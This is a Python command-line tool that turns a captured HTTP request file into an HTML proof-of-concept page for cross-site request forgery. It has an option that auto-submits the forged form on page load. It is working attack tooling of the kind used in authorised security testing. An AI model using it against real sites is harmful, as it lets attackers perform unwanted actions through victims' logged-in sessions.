import json
import argparse
from urllib.parse import parse_qs


def print_banner():
    print("""
   _____  _____ _____  ______       _                                _             _   _             
  / ____|/ ____|  __ \|  ____|     | |                              | |           | | (_)            
 | |    | (___ | |__) | |__      __| | ___ _ __ ___   ___  _ __  ___| |_ _ __ __ _| |_ _  ___  _ __  
 | |     \___ \|  _  /|  __|    / _` |/ _ \ '_ ` _ \ / _ \| '_ \/ __| __| '__/ _` | __| |/ _ \| '_ \ 
 | |____ ____) | | \ \| |      | (_| |  __/ | | | | | (_) | | | \__ \ |_| | | (_| | |_| | (_) | | | |
  \_____|_____/|_|  \_\_|       \__,_|\___|_| |_| |_|\___/|_| |_|___/\__|_|  \__,_|\__|_|\___/|_| |_|

                                | |            | |                                                   
                                | |_ ___   ___ | |                                                   
                                | __/ _ \ / _ \| |                                                   
                                | || (_) | (_) | |                                                   
v 0.1 (pre-release) by Qurius    \__\___/ \___/|_|                                                   
""")


def generate_html(method, url, params, autosubmit = False) -> str:
    """
    Generates a HTML file with a form containing the necessary parameters to perform CSRF attack on the vulnerable website. The form has a submit button that 
    """

    form_inputs = ""
    autosubmit_js = "<script>var form = document.querySelector(\"form\");form.submit();</script>"

    for key, value in params.items():
        form_input = f'<input type="hidden" id="{key}" name="{key}" value="{value[0]}">\n\t\t'
        form_inputs += ''.join(form_input)

    final_form  = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF demonstration</title>
</head>
<body>
    <h1>CSRF demonstration</h1>
    <form action="{url}" method="{method}">
        {form_inputs}
        <input type="submit" value="Submit">
    </form>
    {autosubmit_js if autosubmit else ""}
</body>
</html>
'''

    return final_form


def process_http_request(reqeust_path) -> list:
    """
    Parses the text file containing the HTTP request. Function extracts:
    - HTTP method,
    - target URL,
    - and all GET/POST parameters necessary to forge a CSRF request to the vulnerable website.

    Function returns a list of these values.
    """

    with open(reqeust_path, 'r') as file:
        http_request = file.read()

    # Split the request into headers and body
    headers_raw, body = http_request.split('\n\n', 1)

    # METHOD /path HTTP/1.1
    first_line = headers_raw.split('\n')[0].split(' ')

    # HTTP headers
    headers = headers_raw.split('\n')[1:]

    method = first_line[0]
    path = first_line[1]
    host = ""
    content_type = ""

    for header in headers:
        if "Host" in header:
            host = header.split(': ')[1]
        if "Content-Type" in header:
            content_type = header.split(': ')[1]
    
    url = "https://" + host + path

    # Parse the body based on the content type
    if 'application/x-www-form-urlencoded' in content_type:
        params = parse_qs(body)
    elif 'application/json' in content_type:
        params = json.loads(body)
    else:
        params = {}

    return method, url, params


def save(html, outfile) -> None:
    with open(outfile, 'w') as file:
        file.write(html)


if __name__ == '__main__':
    print_banner()

    parser = argparse.ArgumentParser(description="HTTP requests to CSRF PoC converter")

    parser.add_argument('-r', '--request', help='HTTP request file path')
    parser.add_argument('-a', '--autosubmit', action='store_true', help='CSRF payload will be executed automatically, no interaction required (default: button)')
    parser.add_argument('-o', '--output', help='Output file path (default: STDOUT)')

    args = parser.parse_args()

    request_file = args.request
    output_file = args.output if args.output else "STDOUT"
    autosubmit = args.autosubmit

    print(f"Input file: {request_file}")
    print(f"Output file: {output_file}")

    # Process the HTTP request
    method, url, params = process_http_request(request_file)

    # Generate HTML
    html = generate_html(method, url, params, autosubmit)

    # Save to a file or print to STDOUT
    if "STDOUT" not in output_file:
        # Save HTML content to a file
        save(html, output_file)
    else:
        print(html)

